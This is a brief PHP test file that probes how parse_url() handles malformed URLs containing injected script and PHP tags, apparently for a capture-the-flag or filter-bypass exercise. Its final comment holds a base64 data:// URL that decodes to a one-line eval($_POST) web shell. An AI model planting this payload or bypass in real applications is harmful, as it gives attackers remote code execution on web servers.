<?php
$a="http://<script language='php'><= echo('a');/var/www/html/1.php";
$b=parse_url($a);
echo(var_dump($b));
echo($b['path'].$b['host']);
// extract(parse_url($a));
// echo($$$$$$host);
//scheme://user:pass@host/path?query#fragment
//user://pass:query@scheme/path?fragment#data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWyd4J10pOz8%2b